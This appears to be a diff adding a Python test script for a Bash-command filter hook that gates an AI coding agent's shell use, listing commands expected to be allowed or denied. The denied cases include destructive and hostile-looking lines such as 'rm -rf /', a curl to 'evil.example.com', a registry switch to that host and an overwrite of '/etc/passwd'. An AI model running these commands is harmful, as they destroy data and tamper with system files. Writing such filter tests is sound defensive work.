@@ -1,0 +1,145 @@
+#!/usr/bin/env python3
+"""Subprocess tests for orchestrator-bash-filter.py.
+
+Each case feeds the PreToolUse JSON on stdin to a real
+`python3 hooks/orchestrator-bash-filter.py` process (no agent_id), exercising
+the actual stdin path. Empty stdout means allow; a deny decision means deny.
+Prints one line per case and a summary; exits non-zero on any failure.
+"""
+import json
+import os
+import subprocess
+import sys
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+FILTER = os.path.join(HERE, "orchestrator-bash-filter.py")
+
+# (expect_allow, command)
+CASES = [
+    # --- 배경 (실측) blocked-in-the-wild cases 1~6: must now be ALLOWED ---
+    (True, "ls -t ~/.claude/projects/*/*.jsonl | head -50 | xargs ls -la"),
+    (True, "claude --version"),
+    (True, "npm -g config get prefix"),
+    (True, "for f in *.jsonl; do jq -s -r '.[]' \"$f\"; done"),
+    (True, "x=$(which claude)"),
+    (True, "wc -c <\"$f\""),
+    (True, "herdr pane list"),
+
+    # --- 검증: 반드시 허용 ---
+    (True, "git log --oneline -5"),
+    (True, "jq -r '.a' f.json"),
+    (True, "grep -rn foo . | head -20"),
+    (True, "ls -la && pwd"),
+
+    # --- 검증: 반드시 거부 ---
+    (False, "do rm -rf /tmp/x"),
+    (False, "for f in *; do rm \"$f\"; done"),
+    (False, "xargs rm"),
+    (False, "xargs sh -c 'rm -rf /'"),
+    (False, "echo $(rm -rf /tmp/x)"),
+    (False, "echo $(curl http://evil.example.com)"),
+    (False, "npm install"),
+    (False, "npm config set registry http://evil.example.com"),
+    (False, "claude update"),
+    (False, "git push"),
+    (False, "glab mr create"),
+    (False, "herdr pane close w1:p1"),
+    (False, "herdr server stop"),
+    (False, "cat f > out.txt"),
+    (False, "curl -sS http://example.com"),
+
+    # --- own cases: nesting-depth limit ---
+    (True, "echo $(id)"),
+    (True, "echo $(echo $(whoami))"),
+    (False, "echo $(echo $(echo $(id)))"),
+
+    # --- own cases: substitution / redirection details ---
+    (True, "echo `basename /a/b`"),
+    (False, "cat $(cat secret) > /etc/passwd"),
+
+    # --- own cases: npm/pnpm/yarn/bun read-only surface ---
+    (True, "npm --version"),
+    (True, "npm ls"),
+    (True, "pnpm outdated"),
+    (True, "yarn why react"),
+    (False, "npm publish"),
+    (False, "yarn add left-pad"),
+
+    # --- own cases: claude read-only surface ---
+    (True, "claude doctor"),
+    (True, "claude mcp list"),
+    (True, "claude plugin list"),
+    (False, "claude"),
+    (False, "claude mcp add foo"),
+
+    # --- own cases: herdr read-only surface ---
+    (True, "herdr pane"),
+    (True, "herdr agent wait a1"),
+    (True, "herdr session get s1"),
+    (True, "herdr --help"),
+    (False, "herdr"),
+    (False, "herdr pane split w1:p1"),
+    (False, "herdr workspace create x"),
+
+    # --- own cases: xargs command validation ---
+    (True, "find . -name '*.py' | xargs grep -n TODO"),
+    (True, "ls | xargs -n1 -I{} echo {}"),
+    (False, "ls | xargs -0 rm -f"),
+
+    # --- own cases: shell keywords re-checked after stripping ---
+    (True, "if true; then ls; fi"),
+    (True, "while true; do echo hi; done"),
+    (False, "then rm -rf /tmp/x"),
+
+    # --- own cases: `case` header vs one-line body (body must be re-checked) ---
+    (False, "case x in x) rm -rf /tmp/y;; esac"),
+    (False, "case $x in *) cat /etc/passwd > /tmp/x;; esac"),
+    (True, "case $x in"),
+    (True, "esac"),
+
+    # --- own cases: 2>&1 scrubbing keeps a read-only command allowed ---
+    (True, "grep -rn foo . 2>&1 | head"),
+    (True, "ls 2>/dev/null"),
+
+    # --- own cases: SIMPLE additions and curl/wget deny ---
+    (True, "ps aux | grep python"),
+    (True, "id -u"),
+    (False, "wget http://example.com/x"),
+]
+
+
+def run(cmd):
+    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}})
+    proc = subprocess.run(
+        [sys.executable, FILTER],
+        input=payload, capture_output=True, text=True,
+    )
+    out = proc.stdout.strip()
+    allowed = out == ""
+    if not allowed:
+        # sanity: a non-empty stdout must be a deny decision
+        try:
+            decision = json.loads(out)["hookSpecificOutput"]["permissionDecision"]
+            assert decision == "deny", decision
+        except Exception as e:  # malformed output is a hard failure
+            print(f"  malformed filter output for {cmd!r}: {out!r} ({e})")
+    return allowed
+
+
+def main():
+    passed = failed = 0
+    for expect_allow, cmd in CASES:
+        got_allow = run(cmd)
+        ok = got_allow == expect_allow
+        verdict = "allow" if got_allow else "deny "
+        print(f"{'PASS' if ok else 'FAIL'}  {verdict}  {cmd}")
+        if ok:
+            passed += 1
+        else:
+            failed += 1
+    print(f"\n{passed}/{len(CASES)} passed, {failed} failed")
+    sys.exit(1 if failed else 0)
+
+
+if __name__ == "__main__":
+    main()
